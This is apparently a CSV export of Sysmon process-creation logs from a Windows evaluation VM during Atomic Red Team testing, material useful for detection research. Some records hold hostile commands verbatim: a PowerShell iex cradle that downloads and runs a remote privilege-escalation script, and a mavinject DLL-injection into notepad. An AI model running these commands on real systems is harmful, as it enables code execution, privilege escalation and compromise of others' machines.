Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19575,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-7320-658c-c401-000000000f00},3588,448,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:28.0039985Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:28.002,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:28.0039985Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:28.002</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">448</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" /SESSION:DagX63TB7UWEA8nJpMM7CwAAAAEBAAAAAZBU9AIAAAAAAAA=",-,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,-,,,,,,,1,19574,,-,"MD5=04EF2F92AB6A28772E9882231354AEA2,SHA256=3FCC0A03FF6CD99504403CF106558C149717C7A8CA025BD23137469456F1F065,IMPHASH=9872652735563E0952795DC53C6BFB45",C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,-,"""C:\Windows\system32\notepad.exe"" ",C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe,{f57bd86a-731e-658c-c101-000000000f00},10768,WINDEV2309EVAL\User,{f57bd86a-731e-658c-c301-000000000f00},3588,5520,-,,,,,-,,,,,,2023-12-27T18:55:26.6763330Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:26.675,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:26.6763330Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:26.675</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731e-658c-c301-000000000f00}</Data>
      <Data Name=""ProcessId"">5520</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" /SESSION:DagX63TB7UWEA8nJpMM7CwAAAAEBAAAAAZBU9AIAAAAAAAA=</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=04EF2F92AB6A28772E9882231354AEA2,SHA256=3FCC0A03FF6CD99504403CF106558C149717C7A8CA025BD23137469456F1F065,IMPHASH=9872652735563E0952795DC53C6BFB45</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-731e-658c-c101-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10768</Data>
      <Data Name=""ParentImage"">C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\notepad.exe"" </Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\mavinject.exe"" 10768 /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft Application Virtualization Injector,,,,,,,1,19573,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=42EBBBC38748BC5F303FC95EE27F3F37,SHA256=6252ED8283B00D388472456C042A809D83473AB24CA0306AF52A4524A5A7FBC9,IMPHASH=DCDD0A1B4E87EE2E235253DF5FA5EA2E",C:\Windows\System32\mavinject.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,mavinject64.exe,"""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-731c-658c-bf01-000000000f00},9400,WINDEV2309EVAL\User,{f57bd86a-731e-658c-c201-000000000f00},3588,10384,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:26.6691664Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:26.665,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:26.6691664Z""/>
      <EventRecordID>19573</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:26.665</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731e-658c-c201-000000000f00}</Data>
      <Data Name=""ProcessId"">10384</Data>
      <Data Name=""Image"">C:\Windows\System32\mavinject.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft Application Virtualization Injector</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">mavinject64.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\mavinject.exe"" 10768 /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=42EBBBC38748BC5F303FC95EE27F3F37,SHA256=6252ED8283B00D388472456C042A809D83473AB24CA0306AF52A4524A5A7FBC9,IMPHASH=DCDD0A1B4E87EE2E235253DF5FA5EA2E</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-731c-658c-bf01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">9400</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\notepad.exe"" ",-,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,-,,,,,,,1,19572,,-,"MD5=04EF2F92AB6A28772E9882231354AEA2,SHA256=3FCC0A03FF6CD99504403CF106558C149717C7A8CA025BD23137469456F1F065,IMPHASH=9872652735563E0952795DC53C6BFB45",C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,-,"""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-731c-658c-bf01-000000000f00},9400,WINDEV2309EVAL\User,{f57bd86a-731e-658c-c101-000000000f00},3588,10768,-,,,,,-,,,,,,2023-12-27T18:55:26.5539918Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:26.540,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:26.5539918Z""/>
      <EventRecordID>19572</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:26.540</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731e-658c-c101-000000000f00}</Data>
      <Data Name=""ProcessId"">10768</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2310.13.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\notepad.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=04EF2F92AB6A28772E9882231354AEA2,SHA256=3FCC0A03FF6CD99504403CF106558C149717C7A8CA025BD23137469456F1F065,IMPHASH=9872652735563E0952795DC53C6BFB45</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-731c-658c-bf01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">9400</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 18:55:25.096,,,,,,,,,11,19571,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-731c-658c-bf01-000000000f00},3588,9400,,,,,,-,,,,,,2023-12-27T18:55:25.0997983Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4nylsj0q.arf.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:25.096,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:25.0997983Z""/>
      <EventRecordID>19571</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:25.096</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731c-658c-bf01-000000000f00}</Data>
      <Data Name=""ProcessId"">9400</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4nylsj0q.arf.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 18:55:25.096</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19570,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-731c-658c-bf01-000000000f00},3588,9400,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:24.9658255Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:24.964,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:24.9658255Z""/>
      <EventRecordID>19570</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:24.964</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731c-658c-bf01-000000000f00}</Data>
      <Data Name=""ProcessId"">9400</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$mypid = (Start-Process notepad -PassThru).id
mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\""""
Stop-Process -processname notepad}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,,,,,,,1,19569,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,whoami.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-731b-658c-be01-000000000f00},3588,2628,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:23.8783676Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:23.876,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:23.8783676Z""/>
      <EventRecordID>19569</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:23.876</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731b-658c-be01-000000000f00}</Data>
      <Data Name=""ProcessId"">2628</Data>
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,,,,,,,1,19568,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,hostname.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-731b-658c-bd01-000000000f00},3588,10552,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:23.8497401Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:23.848,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:23.8497401Z""/>
      <EventRecordID>19568</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:23.848</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-731b-658c-bd01-000000000f00}</Data>
      <Data Name=""ProcessId"">10552</Data>
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Hostname APP</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E1EA6EFF1F45AA136A2A2E18EACC1F73,SHA256=4634E6685E402CC3CC8843589F4E8D8AC515F5F05D319E835A262B69B32BDB45,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>

"
